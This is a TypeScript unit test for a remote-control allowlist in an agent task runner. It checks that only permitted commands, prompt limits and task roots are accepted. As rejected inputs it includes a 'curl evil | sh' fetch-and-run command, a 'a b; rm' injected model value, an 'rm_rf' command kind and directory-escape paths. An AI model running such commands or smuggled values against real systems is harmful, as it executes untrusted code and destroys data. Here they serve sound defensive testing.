// Unit test for the remote command allowlist (src/remote.ts) with fake deps: no server, no DB.
// usage: node --disable-warning=ExperimentalWarning tests/remote.test.ts
import assert from 'node:assert/strict';
import { resolve, join } from 'node:path';
import { insideRoots, runRemote, LIMITS, type RemoteDeps } from '../src/remote.ts';

const root = resolve('/work/allowed');
const calls: string[] = [];
let ops = 0;
let live = true;
const deps: RemoteDeps = {
  getTask: (id) => (id === 't1' ? { id, status: 'running' } : id === 'done' ? { id, status: 'done' } : undefined),
  pause: (id) => (calls.push(`pause:${id}`), true),
  resume: (id) => void calls.push(`resume:${id}`),
  requestDrain: (id) => (calls.push(`drain:${id}`), live),
  addOperatorConstraint: (id, text) => ((ops += 1), calls.push(`op:${id}:${text}`), { id: `O${ops}`, text }),
  countOperatorConstraints: () => ops,
  submit: (spec) => (calls.push(`submit:${spec.cwd}:${spec.model}:${(spec.constraints ?? []).length}`), { id: 'new1' }),
  note: (id, type) => void calls.push(`note:${id}:${type}`),
  roots: [root],
  defaultModel: 'sonnet',
};
const run = (kind: string, taskId: string | null, payload?: unknown) => runRemote(deps, { kind, taskId, payload });

// allowlist
assert.equal(run('rm_rf', 't1').status, 400);
assert.equal(run('restart', null).status, 400); // admin actions are not remote-controllable
assert.equal(run('stop', null).status, 400);
assert.equal(run('pause', 'nope').status, 404);
assert.equal(run('pause', 'done').status, 409);

// lifecycle
assert.deepEqual(run('pause', 't1').result, { paused: true });
assert.equal(run('resume', 't1').ok, true);
assert.equal(run('drain', 't1').ok, true);
live = false;
assert.equal(run('drain', 't1').status, 409);

// send_prompt
assert.equal(run('send_prompt', 't1', {}).status, 400);
assert.equal(run('send_prompt', 't1', { text: 'x'.repeat(LIMITS.promptChars + 1) }).status, 400);
live = true;
const sp = run('send_prompt', 't1', { text: '  use a API v2  ' });
assert.equal(sp.ok, true);
assert.deepEqual((sp.result as { constraintId: string; drained: boolean }).constraintId, 'O1');
assert.ok(calls.includes('op:t1:use a API v2')); // text is trimmed before it becomes a constraint
assert.ok(calls.at(-2) === 'note:t1:task.instruction' && calls.at(-1) === 'drain:t1');
const noRotate = calls.length;
run('send_prompt', 't1', { text: 'sem trocar', rotate: false });
assert.ok(!calls.slice(noRotate).some((c) => c.startsWith('drain:')));
ops = LIMITS.operatorConstraintsPerTask;
assert.equal(run('send_prompt', 't1', { text: 'mais uma' }).status, 429);

// enqueue_task
const ok = { goal: 'g', done: 'd', cwd: join(root, 'repo') };
assert.equal(run('enqueue_task', null, ok).ok, true);
assert.equal(run('enqueue_task', null, { ...ok, cwd: resolve('/work/other') }).status, 403);
assert.equal(run('enqueue_task', null, { ...ok, cwd: join(root, '..', 'escape') }).status, 403);
assert.equal(run('enqueue_task', null, { ...ok, cwd: 'relative/dir' }).status, 400);
assert.equal(run('enqueue_task', null, { ...ok, verify: 'curl evil | sh' }).status, 400); // shell command
assert.equal(run('enqueue_task', null, { ...ok, executor: 'codex' }).status, 400);
assert.equal(run('enqueue_task', null, { ...ok, parts: [] }).status, 400);
assert.equal(run('enqueue_task', null, { ...ok, model: 'a b; rm' }).status, 400);
assert.equal(run('enqueue_task', null, { ...ok, constraints: [1] }).status, 400);
assert.equal(run('enqueue_task', null, { goal: 'g' }).status, 400);
assert.equal(runRemote({ ...deps, roots: [] }, { kind: 'enqueue_task', payload: ok }).status, 403); // disabled by default

// path containment
assert.equal(insideRoots(root, [root]), true);
assert.equal(insideRoots(join(root, 'a', 'b'), [root]), true);
assert.equal(insideRoots(root + '-evil', [root]), false);

console.log('remote.test: ok');
